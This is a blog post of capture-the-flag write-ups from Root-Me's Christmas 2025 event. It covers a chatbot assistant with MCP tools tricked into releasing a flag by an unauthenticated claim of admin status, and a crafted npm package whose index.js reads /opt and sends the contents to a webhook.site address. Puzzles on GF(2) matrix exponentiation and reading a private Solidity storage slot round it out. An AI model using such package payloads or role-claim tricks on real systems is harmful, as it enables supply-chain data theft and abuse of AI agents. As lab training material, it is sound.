---
layout: post
title: "XMas Root Me 2025"
author: cryptax
date: 2026-01-01
draft: true
tags:
- rootme
- 2025
- ctf
- AI
---

# Xmas Root Me CTF 2025

## X-Mas Assistant Day 1

### Description of the challenge

"Meet your X-Mas Assistant! It will help you throughout this entire month of CTF, providing a brand-new way to interact with CTFd through a "futuristic" Chatbot UI. This assistant talks directly to the CTFd API for you! Try it now! Can you exploit its MCP quirks and uncover the flag?

This is not a web challenge.Meet your X-Mas Assistant! It will help you throughout this entire month of CTF, providing a brand-new way to interact with CTFd through a "futuristic" Chatbot UI. This assistant talks directly to the CTFd API for you! Try it now! Can you exploit its MCP quirks and uncover the flag?

This is not a web challenge."

We get a link to our own instance, which is a web interface to an AI.

### Reconnaissance

I download the HTML page, and don't see anything hidden  in it. We see the expects entry points are `/mcp/chat` and `/mcp/reset`.

```
await fetch('/mcp/reset', { method: 'POST' });
const response = await fetch('/mcp/chat', {
```

I start asking a few questions to the AI, like "How are you?", and it tells me it can help me access the CTFd interface. 

### Functionalities

![](/images/xmas2025-day1-listfunc.png)

The functionalites are real. If I ask to list users, I do indeed get the current list of users on the Xmas root CTF.

Being admin is always important so I list them, and recognize a few names of known admins (hi!).

![](/images/xmas2025-day1-getadmins.png)

### Solve

To get the flag, we need to know the challenge id. 

> I initially tried 1 but couldn't retrieve its flag whatever admin username I supplied. This is because 1 is not a valid/active challenge (being a CTFd admin myself, this happens very often, you create test challenges they get ID 1 and then you delete them, so actually your real challenges start later).

So, I list challenges to retrieve the ID of the challenge I want (day 1). We see it's challenge 11.

![](/images/xmas2025-day1-getchall.png)

Then, I just get the flag for it. You don't get the flag if you're not admin. But you actually don't need to authenticate to be admin, just claim you are one, that's the flaw.

![](/images/xmas2025-day1-getflag.png)
![](/images/xmas2025-day1-getflag2.png)
![](/images/xmas2025-day1-getflag3.png)

> Simple but nice challenge, I liked it!

## X-Mas Assistant Day 3

### Description of the challenge

```
Every winter, the elves’ factory relies on a massive statistics system to optimize gift production. Everything was running smoothly… until DevSecOops the elf spilled his eggnog all over his laptop. Disaster: he lost the only access to the production server, which contains the one and only copy of Santa’s List!

From his… let’s say foggy memory, the file should be somewhere inside the /opt/ directory.
```

A public registry for the challenge has been setup 
https://registry.challenges.xmas.root-me and we are given a dedicated container (e.g http://dyn-01.xmas.root-me.org:18393/login.html)

### Reconnaissance

We log in the Elf Workshop with any credentials. For example, admin/admin works.

![](/images/xmas2025-day3-page.png)

The page source shows ends points for `/api/profile`, `/login.html`, `/api/package` and `/api/stats`.

```json
const response = await fetch('/api/profile').catch(() => null);
      if (!response || !response.ok) {
        window.location.href = '/login.html';
        return;
      }
...
const packageResponse = await fetch('/api/package');
        if (packageResponse.ok) {
          const packageJson = await packageResponse.json();
          console.debug('[package] package.json exposed:', packageJson);
        }
...
async function loadStats() {
      const response = await fetch('/api/stats');
      const data = await response.json();
      }
```

We get our cookie, and use it in curl requests:

```
curl -i -H "Cookie: connect.sid=s%3AWaSti_8L3jhKkfFIBTABna8ZbiFD-jCg.bf4Wg3h2TAmnD%2FmpYdy5le1QWWJGzk3qltd7sYC0wPU" http://dyn-01.xmas.root-me.org:18393/api/stats
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 110
ETag: W/"6e-jtqSzrSVZUQhNkS7WOYKTfQyJEU"
Date: Tue, 09 Dec 2025 18:44:45 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"giftsWrapped":121,"toysMade":148,"lettersRead":208,"efficiency":48,"generatedAt":"2025-12-09T18:19:46.873Z"}
```

![](/images/xmas2025-day3-cookie.png)
NB. The cookie value in the image is not the same as in the CURL request.

### Package

With the `/api/package` end point, the response is the JSON for the NPM package:

```json
{
  "name": "elf-stats-tinsel-bauble-144",
  "version": "1.0.0",
  "main": "index.js",
  "description": "Package generated automatically every 2 minutes..",
  "author": "Elf Workshop",
  "license": "MIT"
}
```

![](/images/xmas2025-day3-package.png)

So, the idea is to craft an update of this NPM package and read the `/opt` directory.


### Exploit NPM package

Initialize a package directory: `npm init -y`.

In `package.json`, I re-use the same package name, and I make sure to increment the version each time. The rest is the same as the original version, exception the description (for fun).

```json
{
  "name": "elf-stats-tinsel-bauble-144",
  "version": "1.0.4",
    "main": "index.js",
    "description" : "super package",
  "author": "Elf Workshop",
  "license": "MIT"
}
```

In `index.js`, I write a script that read `/opt`:

```javascript
const fs = require("fs");
const https = require("https");

const data = fs.readdirSync("/opt").join(",");

https.get("https://webhook.site/MY-ID?data=" + encodeURIComponent(data));
```

I open https://webhook.site to get my personal id and replace it here.
So, when my NPM package is executed, the content of `/opt` is posted to my webhook page.

I publish the new npm:

```
# npm publish --registry https://registry.challenges.xmas.root-me.org/
npm notice
npm notice 📦  elf-stats-tinsel-bauble-144@1.0.4
npm notice Tarball Contents
npm notice 229B index.js
npm notice 176B package.json
npm notice Tarball Details
npm notice name: elf-stats-tinsel-bauble-144
npm notice version: 1.0.4
npm notice filename: elf-stats-tinsel-bauble-144-1.0.4.tgz
npm notice package size: 458 B
npm notice unpacked size: 793 B
npm notice shasum: d12739a238872b8099e8ffc4e9dbaf8ee5cf8951
npm notice integrity: sha512-yRzBEzVA0Cn2/[...]55l7kXyesRonQ==
npm notice total files: 4
npm notice
npm notice Publishing to https://registry.challenges.xmas.root-me.org/ with tag latest and default access
+ elf-stats-tinsel-bauble-144@1.0.4
```

It works, I see `/opt` has `santa-list.txt`

![](/images/xmas2025-day3-webhook.png)

### Getting the flag

So, I do the same thing once again, but this time I will read `/opt/santa-list.txt`:

```javascript
const fs = require("fs");
const https = require("https");

const content = fs.readFileSync("/opt/santa-list.txt", "utf8");

https.get("https://webhook.site/MY_ID?data=" + encodeURIComponent(content));
```

Don't forget to modify the version of the NPM package in `package.json`, and then publish the new version.

```
npm publish --registry https://registry.challenges.xmas.root-me.org/
npm notice
npm notice 📦  elf-stats-tinsel-bauble-144@1.0.5
npm notice Tarball Contents
npm notice 232B index.js
npm notice 176B package.json
npm notice Tarball Details
npm notice name: elf-stats-tinsel-bauble-144
npm notice version: 1.0.5
npm notice filename: elf-stats-tinsel-bauble-144-1.0.5.tgz
npm notice package size: 448 B
npm notice unpacked size: 813 B
npm notice shasum: 0043477c0dfcb2dd2029fa3498fa2d9ef55e6e7a
npm notice integrity: sha512-ncn0e2GUmPuTo[...]ALiEeXfoVpMTw==
npm notice total files: 4
npm notice
npm notice Publishing to https://registry.challenges.xmas.root-me.org/ with tag latest and default access
+ elf-stats-tinsel-bauble-144@1.0.5
```

![](/images/xmas2025-day3-webhook.png)

The flag is `RM{_D3p3nd3ncy_C0nfus10n_1s_N0t_4_G4m3_}`


## Community Gift Project - Day 4

### Description 

We are given a ZIP file with a Docker environment: 

- `docker-compose.yml`: builds the container for port 1337
- `Dockerfile`: basic Flask environment with gunicorn which copies `app.py`, `factory.py` and `templates/`
- `requirements.txt`: Python dependencies with Flask and Gunicorn.
- `templates/index.j2`: Jinja 2 template for HTML website with some javascript
- `app.py` and `factory.py`

![](/images/xmas2025-day4-website.png)

### app.py

`app.py` implements a simple Flask application with only 2 routes: / (GET) and /help_santa (POST). 

Each time you help Santa, a global `work_counter` is incremented:

```python
@app.route('/help_santa', methods=['POST'])
def help_santa():
    global work_counter
    with mutex:
        if work_counter < REQUIRED_WORK:
            flag_room.work()
            work_counter += 1
    return redirect(url_for('index'))
```

The goal is to reach an enormous value, which will then display the flag:

```python
REQUIRED_WORK = 1337133713371337133713371337133713371337
...
counter = work_counter
        if counter == REQUIRED_WORK:
            gift_state = 'Gift complete: ' + int(''.join(str(b) for b in flag_room.gift_state), 2).to_bytes(24, 'little').decode()
```

Naturally, the difficulty is that `REQUIRED_WORK` is really huge, no way we're going to POST that many help_santas, even with a script.

### factory.py

The flag is decoded from a bit field state, which is altered each time work is performed:

```python
class LeFlagSynthesisRoom:
    def __init__(self):
        self.instructions = [192, 191, 190, 189, 187, 183, 178, 174, 173, 171, 170, 167, 166, 165, 162, 160, 159, 158, 157, 155, 149, 148, 147, 146, 143, 139, 137, 135, 131, 130, 123, 119, 117, 116, 115, 113, 111, 110, 109, 108, 106, 105, 102, 100, 99, 94, 93, 90, 89, 85, 81, 75, 74, 73, 72, 71, 70, 69, 68, 67, 65, 64, 63, 60, 58, 57, 55, 54, 51, 50, 47, 45, 44, 41, 40, 39, 38, 37, 32, 30, 29, 25, 24, 23, 22, 20, 19, 18, 16, 14, 12, 10, 9, 7, 5, 4, 3, 2]
        self.gift_state =  [0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1]

def work(self):
        s = 0
        for t in self.instructions:
            s ^= self.gift_state[t-1]
        self.gift_state = [s] + self.gift_state[:-1]
```

### Cycle

The gift state is in GF(2)^192 (that's the length of the gift state table).
This group has a *finite number of elements*, and each element depends on the previous one, so after a while, we know we're going to fall back to a state we have already explored, and then all next ones will be predictable. 
In other words, we have a *cycle*.

We can try and explore the cycle length: 

```python
seen = {}
state = gift[:]
i = 0
while tuple(state) not in seen:
    seen[tuple(state)] = i
    state = next_value(state)
    i += 1
```	

Unfortunately, it's very long, so we need to find another trick.

### Linearity

The key observation is that the `work()` function is *linear over GF(2)*: it only does XORs and shifts. 

This means that each update of `gift_state` can be written as a matrix multiplication `x_next = M * x` where M is a 192×192 binary matrix. 

Let's note x_1 the first gift_state. We have:

- `x_2 = M * x_1`
- `x_3 = M * x_2`
- etc

This can be written differently: `x_3 = M * x_2 = M *  M * x_1 = M² * x_1`.
Consequently, to compute `x_1337133713371337133713371337133713371337`, we no longer need to simulate 1337133713371337133713371337133713371337 steps, we can compute an exponentiation `M^1337133713371337133713371337133713371337`. 

### Fast exponentiation

`1337133713371337133713371337133713371337` is a large integer, but that's not really the issue: big int libraries such as numpy know how to handle such integers (and more) without any problem.

However, computing `M^1337133713371337133713371337133713371337` can be speeded up by using [*fast exponentiation*, also known as *exponentiation by squaring*](https://en.wikipedia.org/wiki/Exponentiation_by_squaring).

Basically, the algorithm consists in computing M powered to powers of 2, and perform multiplications only when needed. This reduces the number of multiplications to perform quite dramatically. So, now, we can reasonably compute `M^1337133713371337133713371337133713371337`

```python
def matpow(M, k):
    R = np.eye(n, dtype=np.uint8)
    A = M.copy()
    while k > 0:
        if k & 1:
            R = matmul(R, A)
        A = matmul(A, A)
        k >>= 1
    return R
```

### Building the matrix

We are going to build a matrix M[x,y] where

- M[x,y] = 1 means that new gift_state[x] = old gift_state[y].
- M[x,y] = 0 means that new gift_state[x] is not related to old gift_state[y].

With the following code, we have the first gift_state which is an XOR of selected old bits. 

```python
for t in self.instructions:
            s ^= self.gift_state[t-1]
```		

So, we can put 1 in M[0, t-1].

Then, for the other rows, notice that the code shifts all gift_state to the right:

```python
self.gift_state = [s] + self.gift_state[:-1]
```

So, for the matrix:

```python
for i in range(1, n):
    M[i, i-1] = 1
```


### Solution

```python
import numpy as np

instructions = [192,191,190,189,187,183,178,174,173,171,170,167,166,165,162,160,159,158,157,155,
149,148,147,146,143,139,137,135,131,130,123,119,117,116,115,113,111,110,109,108,106,105,102,100,
99,94,93,90,89,85,81,75,74,73,72,71,70,69,68,67,65,64,63,60,58,57,55,54,51,50,47,45,44,41,40,
39,38,37,32,30,29,25,24,23,22,20,19,18,16,14,12,10,9,7,5,4,3,2]

gift_state = [0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1]

n = len(gift_state)

# we build the matrix
M = np.zeros((n, n), dtype=np.uint8)

for t in instructions:
    M[0, t-1] = 1

for i in range(1, n):
    M[i, i-1] = 1

# @ is matrix multiplication in numpy
# multiply with a vector
def matvec(M, v):
    return (M @ v) % 2

# multiply 2 matrix
def matmul(A, B):
    return (A @ B) % 2

# fast exponentiation: M^k
def matpow(M, k):
    R = np.eye(n, dtype=np.uint8)
    A = M.copy()
    while k > 0:
        if k & 1:
            R = matmul(R, A)
        A = matmul(A, A)
        k >>= 1
    return R

REQUIRED_WORK = 1337133713371337133713371337133713371337

# Compute M^REQUIRED_WORK
Mk = matpow(M, REQUIRED_WORK)

# Apply to initial state
initial = np.array(gift_state, dtype=np.uint8)
final = matvec(Mk, initial)

# Decode flag
bits = ''.join(str(int(b)) for b in final)
flag = int(bits, 2).to_bytes(24, 'little').decode()

print(flag)
```

The flag is `RM{ThX_4_th3_h3lP_;)_:)}`

## X-Mas Assistant Day 5

### Description

```
Last year, Santa noticed that some mischievous elves had been diverting gifts!

This year, he decided to secure his entire supply chain using blockchain technology.

But since Santa isn’t exactly comfortable with this new system, the developer gave him a special key that lets him hand over the distribution process safely...
```

The instance which is launched gives us:

- a private key
- an address
- a challenge address
- a RPC URL
- a Chain ID
- a button to claim the flag

In addition, we are given a solidity contract.

### Solidity contract

The contract consists in a list of elves, gifts and children.
Each elf has a name, gifts are mapped to an elfId and a childId etc.

Santa and Elves have special privileges:

```solidity
modifier onlySanta() {
        require(msg.sender == santaClaus, "Only Santa can access this function");
        _;
    }
```

There is a secret: `bytes32 private magicXmasS3cr3t;` which helps pose as a given elf. If you provide the correct `magixXmasS3cr3t` below as `_guess` you can act as an elf named `_name`.

```solidity
function claimElfBySecret(string calldata _name, bytes32 _guess) external {
        require(_guess == magicXmasS3cr3t, "Bad magic Xmas Secret Word");
        uint256 id = elves.length;
        elves.push(Elf({name: _name, level: 1, account: msg.sender}));
        elvesId[msg.sender] = id + 1;
    }
```

### Exploit

The exploit lies on the fact that, despite being private, `magicXmasS3cr3t` is in reality *not hidden*.
We can:

1. Connect to the RPC
2. Read the magic secret
3. Claim to be an elf


#### Connecting to the RPC

```python
from web3 import Web3
import json

RPC_URL = "http://dyn-02.xmas.root-me.org:12487/rpc"
w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "RPC unreachable"
```

#### Reading the magic secret

Data is organized in slots. We  have:

- Santa Clause in slot 0 ` address public santaClaus;`
- Then dynamic arrays:

```solidity
Elf[] public elves; // 1
Gift[] public gifts; // 2
Child[] public children; //3
```
- Then mappings:

```solidity
mapping(address => uint256) public elvesId; // 4
mapping(address => uint256) public childId; // 5
mapping(address => uint256) public childNonce; // 6
```

- Finally the magic secret `bytes32 private magicXmasS3cr3t; ` is in slot 7.

```python
SLOT_MAGIC = 7

raw = w3.eth.get_storage_at(CHALLENGE, SLOT_MAGIC)
secret = raw.hex()

print("[+] magicXmasS3cr3t =", secret)
```

#### Claim to be an elf

To be an elf, we need to call the function `claimElfBySecret`. We will call it with 2 arguments: the name of the elf "winner", and the secret (`raw`).

```solidity
abi = [{
    "inputs":[
        {"internalType":"string","name":"_name","type":"string"},
        {"internalType":"bytes32","name":"_guess","type":"bytes32"}
    ],
    "name":"claimElfBySecret",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
}]

contract = w3.eth.contract(address=CHALLENGE, abi=abi)
```

To actually perform the call, we need to build a block chain transaction. We use our address, the chain id etc.

```solidity
nonce = w3.eth.get_transaction_count(MY_ADDR)
tx = contract.functions.claimElfBySecret(
    "winner",
    raw
).build_transaction({
    "from": MY_ADDR,
    "nonce": nonce,
    "chainId": CHAIN_ID,
    "gas": 300000,
    "gasPrice": w3.to_wei("1", "gwei")
})
```

Finally, we need to sign the transaction with our private key, and send it.

```solidity
signed = w3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
print("[+] Sent TX:", tx_hash.hex())

receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print("[+] Mined:", receipt)
```

#### Checking it works

If we are an elf, `isSolved` should return True:

```solidity
function isSolved() external view returns (bool) {
        return elvesId[msg.sender] > 0;
    }
```

We can call that in our program:

```solidity

abi = [{
    "inputs": [],
    "name": "isSolved",
    "outputs": [{"internalType":"bool","name":"","type":"bool"}],
    "stateMutability":"view",
    "type":"function"
}]

contract = w3.eth.contract(address=CHALLENGE, abi=abi)
solved = contract.functions.isSolved().call({"from": MY_ADDR})
print("Solved?", solved)
```

### Getting the flag

We run our program:

```
# python3 solve.py 
[+] magicXmasS3cr3t = e62c168a11994fe281bea2d758c047a6412ce69d80159f071e96afbcb85d8cb1
[+] Sent TX: d83ee0c3b276ae5e059a04b0c0ef67a173e844476b1f6d04c1a00933eba61a97
[+] Mined: AttributeDict({'type': 0, 'status': 1, 'cumulativeGasUsed': 119769, 'logs': [], 'logsBloom': HexBytes('0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'), 'transactionHash': HexBytes('0xd83ee0c3b276ae5e059a04b0c0ef67a173e844476b1f6d04c1a00933eba61a97'), 'transactionIndex': 0, 'blockHash': HexBytes('0x3d947ba3454d2baf20b723ead41a2e7081b17df1b432e813c050fdc638156ea6'), 'blockNumber': 6, 'gasUsed': 119769, 'effectiveGasPrice': 1000000000, 'blobGasPrice': 1, 'from': '0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85', 'to': '0x36737631D708Ec79ab3f92E05102F078423388E8', 'contractAddress': None})
Now calling isSolved()
Solved? True
```

Then, on the web interface, we press "Claim the Flag" and get it.

![](/images/xmas2025-day5-flag.png)

The flag is `RM{N0_S3cr3t_C4n_B3_H1dd3n_0n_Ch41n}`.
